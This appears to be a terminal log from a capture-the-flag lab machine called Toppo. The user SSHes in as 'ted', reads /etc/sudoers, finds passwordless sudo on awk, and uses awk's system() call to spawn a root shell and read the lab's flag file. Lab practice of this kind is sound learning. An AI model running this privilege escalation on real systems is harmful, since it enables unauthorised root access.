
```
root@hal:~# ssh ted@192.168.57.3
The authenticity of host '192.168.57.3 (192.168.57.3)' can't be established.
ECDSA key fingerprint is SHA256:+i9tqbQwK978CB+XRr02pS6QPd3evJ+lueOkK1LTtU0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.57.3' (ECDSA) to the list of known hosts.
ted@192.168.57.3's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$ ls -la
total 24
drwxr-xr-x 2 ted  ted  4096 Apr 15  2018 .
drwxr-xr-x 3 root root 4096 Apr 15  2018 ..
-rw------- 1 ted  ted     1 Apr 15  2018 .bash_history
-rw-r--r-- 1 ted  ted   220 Apr 15  2018 .bash_logout
-rw-r--r-- 1 ted  ted  3515 Apr 15  2018 .bashrc
-rw-r--r-- 1 ted  ted   675 Apr 15  2018 .profile
ted@Toppo:~$ cat /etc/sudoers
ted ALL=(ALL) NOPASSWD: /usr/bin/awk

ted@Toppo:~$ which nc
/bin/nc
ted@Toppo:~$ awk 'BEGIN {system("whoami")}'
root
ted@Toppo:~$ cd /root/
-bash: cd: /root/: Permission denied
ted@Toppo:~$ sudo -l -l
-bash: sudo: command not found
ted@Toppo:~$ awk 'BEGIN {system("/bin/sh")}'
# root
/bin/sh: 1: root: not found
# ls
# 
# cd /root/
# ls
flag.txt
# cat flag.txt
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
# 
```
